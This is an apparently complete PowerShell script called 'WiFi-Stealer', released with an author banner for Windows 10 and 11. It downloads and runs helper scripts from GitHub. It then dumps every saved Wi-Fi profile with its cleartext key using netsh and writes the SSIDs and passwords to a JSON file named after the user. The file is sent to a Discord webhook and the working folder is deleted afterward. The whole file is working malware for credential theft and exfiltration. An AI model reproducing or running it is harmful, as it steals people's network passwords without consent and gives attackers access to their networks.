#############################################################################################################################################################################
#__________________________________________________________/\\\______________________/\\\\\\\_______________________/\\\______________________________________/\\\__        #
# ________________________________________________________/\\\\\____________________/\\\/////\\\_________________/\\\\\\\_____________________________________\/\\\__       #
#  ______________________________________________________/\\\/\\\______/\\\\\\\\\___/\\\____\//\\\_______________\/////\\\_____________________________________\/\\\__      #
#   __/\\\____/\\\__/\\/\\\\\\____/\\____/\\___/\\______/\\\/\/\\\_____/\\\/////\\\_\/\\\_____\/\\\__/\\/\\\\\\_______\/\\\__/\\\\\\\\\\\_____/\\\\\\\\_________\/\\\__     #
#    _\/\\\___\/\\\_\/\\\////\\\__\/\\\__/\\\\_/\\\____/\\\/__\/\\\____\/\\\\\\\\\\__\/\\\_____\/\\\_\/\\\////\\\______\/\\\_\///////\\\/____/\\\/////\\\___/\\\\\\\\\__    #
#     _\/\\\___\/\\\_\/\\\__\//\\\_\//\\\/\\\\\/\\\___/\\\\\\\\\\\\\\\\_\/\\\//////___\/\\\_____\/\\\_\/\\\__\//\\\_____\/\\\______/\\\/_____/\\\\\\\\\\\___/\\\////\\\__   #
#      _\/\\\___\/\\\_\/\\\___\/\\\__\//\\\\\/\\\\\___\///////////\\\//__\/\\\_________\//\\\____/\\\__\/\\\___\/\\\_____\/\\\____/\\\/______\//\\///////___\/\\\__\/\\\__  #
#       _\//\\\\\\\\\__\/\\\___\/\\\___\//\\\\//\\\______________\/\\\____\/\\\__________\///\\\\\\\/___\/\\\___\/\\\_____\/\\\__/\\\\\\\\\\\__\//\\\\\\\\\\_\//\\\\\\\/\\_ #
#        __\/////////___\///____\///_____\///__\///_______________\///_____\///_____________\///////_____\///____\///______\///__\///////////____\//////////___\///////\//__#
#                                                                                                                                                                           #
#  github.com/unwe4p0n1zed                                                tiktok.com/@unwe4p0n1zed                                                                          #
#  twitter.com/unwe4p0n1zed                                               youtube.com/@unwe4p0n1zed                                                                         #
#                                                                                                                                                                           #
#  Title: WiFi-Stealer                                                                                                                                                      #
#  Description: This PowerShell code can steal user Wi-Fi credentials, save it as JSON file and send it over Discord channel using the provided webhook URL.                #
#  Target: Windows 10, 11                                                                                                                                                   #
#___________________________________________________________________________________________________________________________________________________________________________#
#                                             __  __________  _      ______________ __  ________   ___  __________  ____     __                                             #
#                                            / / / / __/ __/ | | /| / /  _/_  __/ // / / ___/ _ | / _ \/ __/ __/ / / / /    / /                                             #
#                                           / /_/ _\ \/ _/   | |/ |/ _/ /  / / / _  / / /__/ __ |/ , _/ _// _// /_/ / /__  /_/                                              #
#                                           \____/___/___/   |__/|__/___/ /_/ /_//_/  \___/_/ |_/_/|_/___/_/  \____/____/ (_)                                               #
#############################################################################################################################################################################

# get all the scripts needed 
Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/unwe4p0n1zed/Powershell-Scripts/main/Functions/Upload-Discord/Upload-Discord.ps1'))
Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/unwe4p0n1zed/Powershell-Scripts/main/Functions/Remove-FileOrFolder/Remove-FileOrFolder.ps1'))

# set discord webhook url
$webhookUrl = '<SET_DISCORD_URL_HERE>'
 
# randomize directory name
$dir = -join ((65..90) + (97..122) | Get-Random -Count 14 | % {[char]$_})

# create directory
New-Item -Path $env:temp -Name $dir -ItemType "directory"

# set new directory as current dicrectory
$fullPath = "$env:temp/$dir"
Set-Location -Path $fullPath

# export wlan data files to current directory
netsh wlan export profile key=clear

# list all files
$files = Get-ChildItem ./ -recurse

# loop over files and grab data
$data = foreach ($file in $files) { [xml]$xml = Get-Content -Path $file.Name; $xml.WLANProfile.SSIDConfig.SSID | Select-Object -Property name, @{Name="password";Expression={$xml.WLANProfile.MSM.security.sharedKey.keyMaterial}}, @{Name="bssid";Expression={$xml.WLANProfile.SSIDConfig.SSID.hex}}} 

# save JSON file with credentials data
$username = (Get-ChildItem Env:\USERNAME).Value
$jsonFileName = "WiFi-Credentials-$username.json"
$data | ConvertTo-Json | Out-File $jsonFileName
 
# send discord message and files
& Upload-Discord -t "WiFi Credentials - $username" -f $jsonFileName -u $webhookUrl

# remove folder with files
Set-Location ../
Remove-FileOrFolder -ip $fullPath -it "Folder" 

EXIT
